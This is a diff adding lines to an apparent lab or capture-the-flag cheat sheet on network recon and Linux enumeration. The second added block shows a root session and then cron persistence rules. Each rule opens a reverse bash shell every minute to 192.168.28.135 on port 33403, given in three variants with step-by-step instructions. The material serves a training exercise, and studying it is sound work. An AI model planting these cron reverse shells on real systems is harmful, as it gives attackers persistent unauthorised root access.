@@ -33,6 +33,7 @@ It focuses on recon, enumeration, analysis, and incident-response style triage. 
 
 ### Host discovery
 Identify live hosts from **within the target network / prior hop** when segmentation prevents direct visibility.
+You can do this by logging into the first box, setting up a dynamic, or building a local - your choice. Either way you will need to do a ping sweep to identify where you are going.
 
 **Windows ping sweep**
 ```bat
@@ -465,6 +466,47 @@ MIN  HOUR  DOM  MON  DOW   command
 - `*` means “every”
 - every minute: `* * * * * <command>`
 - every 5 minutes: `*/5 * * * * <command>`
+
+
+root@lin2:~# sudo -l
+Matching Defaults entries for root on lin2:
+    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin
+
+User root may run the following commands on lin2:
+    (ALL : ALL) ALL
+root@lin2:~# crontab -l
+no crontab for root
+root@lin2:~# cat /etc/crontab
+# /etc/crontab: system-wide crontab
+# Unlike any other crontab you don't have to run the `crontab'
+# command to install the new version when you edit this file
+# and files in /etc/cron.d. These files also have username fields,
+# that none of the other crontabs do.
+
+SHELL=/bin/sh
+PATH=/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin
+
+# m h dom mon dow user	command
+17 *	* * *	root    cd / && run-parts --report /etc/cron.hourly
+25 6	* * *	root	test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.daily )
+47 6	* * 7	root	test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.weekly )
+52 6	1 * *	root	test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.monthly )
+
+# commands to make a change:
+crontab -l
+nano /etc/crontab
+Rule : * * * * * root bash -i >& /dev/tcp/192.168.28.135/33403 0>&1
+
+Altnerate version:
+To implement persistence via a reverse bash shell in a CRON job for the specified IP and port, follow these steps:
+Access the Crontab: Open the root user's crontab for editing by running the command crontab -e. This is located in /var/spool/..
+Add the Reverse Shell Command: Append the following line to the file to ensure the beacon executes every minute:
+Rule: * * * * * /bin/bash -c 'bash -i >& /dev/tcp/192.168.28.135/33403 0>&1'
+Verify Permissions: If you prefer using a system-wide CRON directory, you can create a file in /etc/cron.d/ with the same timing syntax, ensuring it specifies the root user:
+Rule: * * * * * root /bin/bash -c 'bash -i >& /dev/tcp/192.168.28.135/33403 0>&1'
+Retrieve the Flag: Once the CRON job triggers and the connection is established, check the /tmp directory for the 20-character flag string.
+For further technical documentation on scheduling tasks, refer to the Ubuntu Cron documentation or the Debian Wiki on Cron.
+
 
 ### World-writable discovery (misconfig hunting)
 ```bash
